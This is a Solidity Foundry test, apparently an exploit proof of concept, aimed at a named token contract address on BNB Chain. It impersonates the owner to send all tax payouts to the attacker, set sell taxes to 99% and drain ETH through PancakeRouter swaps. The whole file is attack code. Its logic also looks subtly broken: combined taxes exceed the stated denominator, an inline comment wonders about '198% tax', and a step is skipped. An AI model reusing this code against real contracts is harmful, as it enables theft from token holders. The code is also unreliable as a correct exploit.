pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CoinToken {
    function owner() external view returns (address);
    function setTaxWallets(address dev, address marketing, address charity) external;
    function triggerTax() external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function setSellTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
}

interface IPancakeRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner in exploit
        // Label contracts for clarity
        vm.label(TARGET, "CoinToken");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address owner = CoinToken(TARGET).owner();
        vm.label(owner, "Owner");

        // Step 2: Record initial balance
        uint256 initialBalance = address(this).balance;

        // Step 3: Get router and pair addresses from contract
        // We need to interact with Uniswap to sell tokens
        // First, let's get some tokens from owner
        vm.startPrank(owner);

        // Note: removeExclude function doesn't exist in the interface
        // We'll skip this step since it's not essential for the exploit logic

        // Set attacker as all tax wallets to receive all ETH
        CoinToken(TARGET).setTaxWallets(address(this), address(this), address(this));

        // Set very high sell tax (99% each) to accumulate tax quickly
        // denominator = 100, so 99 means 99% tax
        CoinToken(TARGET).setSellTax(99, 99, 0, 0); // 99% dev, 99% marketing, 0% liquidity, 0% charity

        // Transfer some tokens to attacker (owner has all initial supply)
        uint256 tokensToTransfer = CoinToken(TARGET).balanceOf(owner) / 100; // 1% of owner's balance
        CoinToken(TARGET).transfer(address(this), tokensToTransfer);

        vm.stopPrank();

        // Step 4: Sell tokens to accumulate tax
        // First, get router address - we need to check contract storage or use known PancakeRouter
        // On BSC, PancakeRouter is usually 0x10ED43C718714eb63d5aA57B78B54704E256024E
        address pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        // Approve router to spend our tokens
        CoinToken(TARGET).approve(pancakeRouter, tokensToTransfer);

        // Sell tokens (this will pay 99%+99% = 198% tax? Actually denominator=100, so max 100%)
        // But with 99% tax, almost all goes to contract as tax
        // We need to sell via the pair
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB on BSC
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;

        // Get minimum amount out (0 to accept any)
        uint256 minAmountOut = 0;

        // Execute swap
        IPancakeRouter02(pancakeRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToTransfer,
            minAmountOut,
            path,
            address(this),
            block.timestamp
        );

        // Step 5: Trigger tax swap to distribute accumulated tax ETH
        vm.prank(owner);
        CoinToken(TARGET).triggerTax();

        // Step 6: Check if we received ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "ETH balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

